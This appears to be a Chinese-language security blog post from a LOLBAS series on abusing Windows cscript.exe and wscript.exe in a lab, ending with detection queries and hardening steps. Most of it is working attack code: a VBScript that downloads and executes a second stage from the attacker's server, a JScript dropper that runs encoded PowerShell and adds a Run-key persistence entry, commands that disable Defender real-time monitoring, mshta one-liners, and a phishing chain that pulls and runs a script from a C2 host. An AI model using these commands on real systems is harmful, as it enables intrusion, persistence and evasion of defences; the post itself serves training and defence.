---
title: "【LOLBAS鐵人賽Day8】Cscript/Wscript深度實戰：Windows Script Host的惡意利用"
published: 2025-09-22T06:33:31.000Z
description: "LOLBAS 系列第 8 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

cscript.exe 和 wscript.exe 是用來執行系統管理腳本的工具，  
IT 人員偶爾用它們來自動化一些維護工作  
但這兩個 Windows Script Host 可以執行 VBScript 和 JScript，  
而且可以從遠端下載執行操作 COM 物件，甚至繞過許多安全限制

今天我們來實測 Windows 11 上這對兄弟的危險用法

## Cscript vs Wscript 差異

特性

cscript.exe

wscript.exe

執行模式

命令列模式

視窗模式

輸出方式

輸出到 console

彈出對話框

適合場景

自動化腳本背景執行

互動式腳本

隱蔽性

較高（可以靜默）

較低（會彈窗）

預設關聯

.js, .vbs（需指定）

.js, .vbs（雙擊執行）

## 環境準備

今天的實作會需要兩台機器：

```
Attacker Machine: Kali
Victim Machine: Windows 11

```

### Attacker Machine (Kali)：

```bash
mkdir ~/script_demo
cd ~/script_demo

```

#### payload.vbs (VBScript 測試檔)

```vbscript
Set shell = CreateObject("WScript.Shell")
shell.Run "calc.exe"
shell.Run "cmd.exe /c echo VBS_Executed > C:\Windows\Temp\vbs_test.txt", 0

' 下載並執行
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.open "GET", "http://<kali_ip>:8080/stage2.vbs", False
xhr.send
Execute xhr.responseText

```

#### payload.js (JScript 測試檔)

```javascript
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");

// 建立測試檔案
var fso = new ActiveXObject("Scripting.FileSystemObject");
var file = fso.CreateTextFile("C:\\Windows\\Temp\\js_test.txt", true);
file.WriteLine("JScript Executed at " + new Date());
file.Close();

```

#### dropper.js (進階 payload)

```javascript
var shell = WScript.CreateObject("WScript.Shell");
// 執行 PowerShell (Base64 編碼的指令)
var ps = "powershell -enc V3JpdGUtSG9zdCAnRHJvcHBlciBFeGVjdXRlZCEnIC1Gb3JlZ3JvdW5kQ29sb3IgUmVk";
shell.Run(ps, 0, true);

// 建立持續性
var regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
shell.RegWrite(regPath + "Update", "wscript.exe //B //NoLogo C:\\Windows\\Temp\\update.js", "REG_SZ");

```

#### stage2.vbs (第二階段)

```vbscript
MsgBox "Stage 2 Executed!", 48, "Alert"
CreateObject("WScript.Shell").Run "notepad.exe"

```

#### Web Server

```bash
python3 -m http.server 8080

```

### Victim Machine (Windows 11)：

```cmd
:: 建立測試環境
mkdir C:\TestLab
cd C:\TestLab

:: 暫時關閉防護（測試環境）
powershell -c "Add-MpPreference -ExclusionPath 'C:\TestLab'"
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

```

## 攻擊手法

### 一直接執行腳本（本地與遠端）

```cmd
:: 設定攻擊者 IP
set ATTACKER=10.211.55.6

:: Cscript 執行（命令列模式）
cscript //NoLogo payload.js
cscript //B //NoLogo payload.vbs

:: Wscript 執行（視窗模式）
wscript payload.js
wscript //B payload.vbs

:: 參數說明：
:: //B = Batch mode，不顯示錯誤
:: //NoLogo = 不顯示版權資訊
:: //T:5 = 設定超時時間（秒）
:: //E:jscript = 指定引擎

:: 從網路共享執行（內網滲透）
cscript \\%ATTACKER%\share\payload.js
wscript //B \\internal-server\scripts\update.vbs

```

### 二透過 Echo 建立並執行（Fileless Download）

```cmd
:: 方法1：Echo 建立腳本
echo var s = new ActiveXObject("WScript.Shell"); s.Run("calc.exe"); > temp.js
cscript //NoLogo temp.js

:: 方法2：一行建立並執行 VBScript
echo CreateObject("WScript.Shell").Run "calc.exe" > t.vbs && wscript //B t.vbs && del t.vbs

:: 方法3：PowerShell 建立並執行
powershell -c "echo 'new ActiveXObject(`"WScript.Shell`").Run(`"calc.exe`");' | Out-File test.js; cscript test.js"

:: 方法4：透過 mshta 執行 JavaScript（組合技）
mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cscript //B //NoLogo C:\\TestLab\\payload.js',0);window.close();"

```

## 實戰：完整攻擊鏈

```cmd
:: Step 1: 初始感染（釣魚郵件附件 invoice.pdf.js）
wscript //B invoice.pdf.js

:: Step 2: invoice.pdf.js 內容
var s = new ActiveXObject("WScript.Shell");
s.Run("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2/stage2.ps1')", 0);

:: Step 3: 建立多重持續性
cscript //B //NoLogo persistence.js

:: persistence.js 內容：
:: - 建立排程任務
:: - 寫入登錄機碼  
:: - 複製到啟動資料夾
:: - 建立服務

```

## 偵測&防禦建議

### 檢查痕跡

```powershell
# 尋找腳本檔案
Get-ChildItem -Path C:\ -Include *.js,*.vbs,*.wsf -Recurse -ErrorAction SilentlyContinue |
    Where-Object {$_.CreationTime -gt (Get-Date).AddHours(-24)}

# 檢查 WScript 相關登錄
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" |
    Select-Object * | Where-Object {$_ -match "script"}

# 檢查事件日誌
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |
    Where-Object {$_.Message -match 'cscript|wscript'} |
    Select-Object TimeCreated, Message

```

### 關鍵偵測指標

*   `cscript.exe` 或 `wscript.exe` 執行來自 TempDownloadsEmail 附件資料夾的腳本
*   Script Host 產生 PowerShellcmdrundll32 等子程序
*   Script Host 有網路連線活動
*   //B 參數（靜默執行）的使用

### 停用 Windows Script Host

```cmd
:: 透過登錄機碼停用（需要管理員權限）
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d 0 /f

:: 群組原則停用
:: Computer Configuration > Administrative Templates > Windows Components > Windows Script Host
:: 設定 "Turn off Windows Script Host" 為 Enabled

```

## 總結！

Cscript/Wscript 是被低估的 LOLBAS 工具，因為它們：

*   **原生支援腳本** - VBScript/JScript 功能完整
*   **COM 物件操作** - 幾乎可以做任何事
*   **檔案關聯危險** - 使用者可能誤點擊
*   **難以完全禁用** - 某些系統功能需要